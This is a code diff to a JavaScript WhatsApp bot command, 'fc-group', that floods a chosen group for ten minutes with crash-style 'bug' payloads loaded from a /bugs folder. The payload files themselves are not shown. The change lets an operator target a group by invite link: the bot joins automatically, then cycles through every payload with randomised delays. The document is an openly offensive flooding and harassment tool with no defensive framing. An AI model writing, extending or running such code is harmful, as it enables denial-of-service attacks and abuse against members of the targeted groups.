@@ -4,28 +4,38 @@ const path = require('path');
 
 cmd({
   pattern: 'fc-group',
-  desc: 'Flood a specific group with payloads from /bugs for 10 minutes',
+  desc: 'Flood target group via JID or invite link',
   category: 'bug',
-  react: '🧨',
+  react: '🔫',
   filename: __filename
 }, async (bot, mek, { arg, reply }) => {
   try {
-    const groupId = arg?.trim();
+    if (!arg) return reply('❌ Usage: .fc-group <group JID or invite link>');
 
-    if (!groupId || !groupId.endsWith('@g.us')) {
-      return await reply(`❌ Usage:\n.fc-group <group_id>\n\nExample:\n.fc-group 120363418930899468@g.us`);
+    let targetJid = '';
+
+    // Si se link WhatsApp
+    if (arg.includes('chat.whatsapp.com')) {
+      const inviteCode = arg.split('/').pop().split('?')[0];
+      await bot.groupAcceptInvite(inviteCode);
+      const metadata = await bot.groupMetadata(inviteCode);
+      targetJid = metadata.id;
+    } else if (arg.endsWith('@g.us')) {
+      targetJid = arg;
+    } else {
+      return reply('❌ Invalid input. Use a group JID or a WhatsApp invite link.');
     }
 
     const bugsDir = path.join(__dirname, '../bugs');
     const bugFiles = fs.readdirSync(bugsDir).filter(f => f.endsWith('.js'));
 
     if (bugFiles.length === 0) {
-      return await reply('📁 No payloads found in /bugs folder.');
+      return reply('📁 No payloads found in /bugs folder.');
     }
 
-    await reply(`🚨 *Launching flood on group:* ${groupId}\n📦 Payloads: ${bugFiles.length}\n🕒 Duration: 10 minutes`);
+    await reply(`🚨 *Flooding group:* ${targetJid}\n🕒 Duration: 10 minutes\n📦 Payloads: ${bugFiles.length}`);
 
-    const endTime = Date.now() + 10 * 60 * 1000; // 10 minutes
+    const endTime = Date.now() + 10 * 60 * 1000;
 
     while (Date.now() < endTime) {
       for (const file of bugFiles) {
@@ -48,27 +58,25 @@ cmd({
           }
 
           if (typeof bugPayload === 'function') {
-            await bugPayload(bot, groupId);
+            await bugPayload(bot, targetJid);
           }
 
-        } catch (err) {
-          console.error(`❌ Payload error in ${file}:`, err.message);
+        } catch (e) {
+          console.error(`❌ Error in ${file}:`, e.message);
         }
 
-        await new Promise(res => setTimeout(res, 300 + Math.floor(Math.random() * 400))); // delay 300–700ms
+        await new Promise(r => setTimeout(r, 300 + Math.floor(Math.random() * 400)));
       }
 
-      await new Promise(res => setTimeout(res, 1000)); // delay 1s ant chak sik
+      await new Promise(r => setTimeout(r, 1000));
     }
 
-    await bot.sendMessage(groupId, {
-      text: '✅ *fc-group flood finished.*'
+    await bot.sendMessage(targetJid, {
+      text: '✅ *Flooding complete.*'
     });
 
-    await reply('✅ Done! Flood completed.');
-
-  } catch (e) {
-    console.error('❌ fc-group error:', e);
-    await reply(`❌ Error: ${e.message}`);
+  } catch (err) {
+    console.error('❌ fc-group error:', err);
+    await reply(`❌ Error: ${err.message}`);
   }
 });
